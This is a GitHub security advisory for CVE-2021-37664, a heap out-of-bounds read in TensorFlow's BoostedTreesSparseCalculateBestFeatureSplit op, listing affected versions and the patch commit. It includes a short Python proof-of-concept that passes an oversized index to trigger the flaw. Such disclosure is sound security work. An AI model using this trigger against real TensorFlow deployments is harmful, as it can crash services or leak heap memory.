# [H] Heap OOB in boosted trees

## Summary
Severity: High
Advisory: GHSA-r4c4-5fpq-56wg
CVE: CVE-2021-37664
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-r4c4-5fpq-56wg
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `BoostedTreesSparseCalculateBestFeatureSplit`:

```python
import tensorflow as tf

tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(
  node_id_range=[0,10],
  stats_summary_indices=[[1, 2, 3, 0x1000000]],
  stats_summary_values=[1.0],
  stats_summary_shape=[1,1,1,1],
  l1=l2=[1.0],
  tree_complexity=[0.5],
  min_node_weight=[1.0],
  logits_dimension=3,
  split_type='inequality')                                                                                                                                                                                                                                                                
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) needs to validate that each value in `stats_summary_indices` is in range.
  
### Patches
We have patched the issue in GitHub commit [e84c975313e8e8e38bb2ea118196369c45c51378](https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378).
  
The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r4c4-5fpq-56wg
- https://nvd.nist.gov/vuln/detail/CVE-2021-37664
- https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-577.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-775.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-286.yaml
- https://github.com/tensorflow/tensorflow
